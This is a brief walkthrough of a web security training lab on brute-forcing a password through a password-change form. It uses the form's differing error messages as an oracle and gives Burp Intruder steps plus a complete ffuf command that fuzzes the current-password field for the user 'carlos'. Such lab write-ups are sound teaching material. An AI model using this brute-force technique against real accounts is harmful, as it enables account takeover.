# Lab: Password brute-force via password change

PRACTITIONER


# Method

Login with the provided creds wiener:peter

Study the relationship between current password, new password and confirm new password

Notice the varying error messages when

1) Current password is wrong but new and confirm aren't the same <--Err: Current Password is Incorrect

2) Current password is correct, but new and confirm password aren't the same <--Err: New Passwords Don't Match

3) Current password is correct, but new and confirm password are same <--Err: Logs us out for 1 min


With that noted, we go by message 1 (above)

Send to intruder and set username=carlos with current password set to our payload position, and place any non matching values in password-1 and password-2.

Sort response by length and get the odd one out

OR
use the ffuf command if using burp ce (as intruder here is slow)
```
ffuf -u 'https://<LAB-ID>.web-security-academy.net/my-account/change-password' \ 
-H 'Cookie: session=<SESSION COOKIE HERE>' \
-H 'Content-Type: application/x-www-form-urlencoded' \ 
-d 'username=carlos&current-password=FUZZ&new-password-1=nothing&new-password-2=better' \ 
-w ./passwd.txt -c -fs 3984
```
Note: filter size (fs) may vary

